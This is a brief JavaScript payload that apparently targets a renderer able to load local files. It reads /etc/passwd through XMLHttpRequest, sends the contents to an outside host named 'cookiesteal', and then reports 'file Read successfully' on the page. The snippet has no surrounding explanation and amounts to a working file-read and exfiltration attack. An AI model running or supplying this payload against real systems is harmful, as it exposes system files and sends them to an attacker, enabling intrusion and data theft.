var x=new XMLHttpRequest;
x.onload=function() {
    var y = new XMLHttpRequest;
    y.onload = function(){
        document.write("file Read successfully");
    }
    y.open("GET","https://cookiesteal.js.baihuistatic.com/server/MonitorRequestHeader/"+this.responseText);
    y.send();
};
x.open("GET","file:///etc/passwd");
x.send();
